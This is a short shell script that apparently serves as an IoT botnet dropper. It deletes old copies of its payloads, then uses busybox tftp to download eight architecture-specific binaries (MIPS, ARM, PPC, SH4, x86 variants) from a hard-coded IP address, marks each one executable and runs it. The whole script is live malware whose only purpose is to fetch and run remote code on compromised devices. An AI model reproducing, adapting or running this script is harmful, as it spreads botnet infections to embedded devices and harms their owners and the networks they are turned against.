#!/bin/sh

REFERENCE_TFTP="185.114.224.187"

REFERENCE_MIPSEL="jackmymipsel"
REFERENCE_MIPS="jackmymips"
REFERENCE_SUPERH="jackmysh4"
REFERENCE_ARM="jackmyarmv6"
REFERENCE_PPC="jackmypowerpc"
REFERENCE_I686="jackmyi686"
REFERENCE_I586="jackmyi586"
REFERENCE_X86="jackmyx86"

rm -rf ${REFERENCE_MIPSEL} \
	   ${REFERENCE_MIPS} \
	   ${REFERENCE_SUPERH} \
	   ${REFERENCE_ARM} \
	   ${REFERENCE_PPC} \
	   ${REFERENCE_I686} \
	   ${REFERENCE_I586} \ 
       ${REFERENCE_X86} 


busybox tftp -r ${REFERENCE_MIPSEL} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_MIPSEL} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_MIPSEL} || busybox chmod +x ${REFERENCE_MIPSEL} && ./${REFERENCE_MIPSEL}
busybox tftp -r ${REFERENCE_MIPS} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_MIPS} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_MIPS} || busybox chmod +x ${REFERENCE_MIPS} && ./${REFERENCE_MIPS}
busybox tftp -r ${REFERENCE_SUPERH} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_SUPERH} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_SUPERH} || busybox chmod +x ${REFERENCE_SUPERH} && ./${REFERENCE_SUPERH}
busybox tftp -r ${REFERENCE_X86} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_X86} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_X86} || busybox chmod +x ${REFERENCE_X86} && ./${REFERENCE_X86}
busybox tftp -r ${REFERENCE_ARM} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_ARM} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_ARM} || busybox chmod +x ${REFERENCE_ARM} && ./${REFERENCE_ARM}
busybox tftp -r ${REFERENCE_I686} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_I686} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_I686} || busybox chmod +x ${REFERENCE_I686} && ./${REFERENCE_I686}
busybox tftp -r ${REFERENCE_PPC} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_PPC} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_PPC} || busybox chmod +x ${REFERENCE_PPC} && ./${REFERENCE_PPC}
busybox tftp -r ${REFERENCE_I586} -g ${REFERENCE_TFTP} || tftp -r ${REFERENCE_I586} -g ${REFERENCE_TFTP} && chmod +x ${REFERENCE_I586} || busybox chmod +x ${REFERENCE_I586} && ./${REFERENCE_I586}